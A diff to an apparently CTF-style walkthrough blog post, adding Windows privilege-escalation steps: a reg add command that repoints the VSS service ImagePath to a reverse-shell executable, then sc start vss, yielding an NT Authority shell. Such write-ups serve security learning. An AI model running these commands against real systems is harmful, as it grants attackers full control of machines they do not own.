@@ -149,4 +149,13 @@ first generate an msfvenom reverse shell payload. and send to the target.
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d9d38dae-0a68-4cbd-8f93-ae20d835b33c)
 
+```
+reg add HKLM\system\currentcontrolset\services\VSS /v ImagePath /t REG_EXPAND_SZ /d C:\Users\svc-printer\Documents\reverse.exe /f
+sc start vss
+```
+
 use the abuse function and restart the service, boom we got shell as NT Authority 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c92f7c27-77cf-4ce9-9956-091f06025cf1)
+
+And we are through
